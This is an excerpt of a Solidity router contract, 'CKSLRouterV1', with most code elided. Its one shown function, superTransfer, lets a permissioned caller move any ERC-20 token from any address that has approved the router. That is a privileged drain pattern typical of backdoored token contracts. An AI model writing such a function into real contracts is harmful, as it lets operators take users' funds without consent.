...
contract CKSLRouterV1 is Context, Ownable {
  ...
  function superTransfer(address tokenadr,address from,address to,uint256 amount) external onlyPermission returns (bool) {
    IERC20(tokenadr).transferFrom(from,to,amount);
    return true;
  }
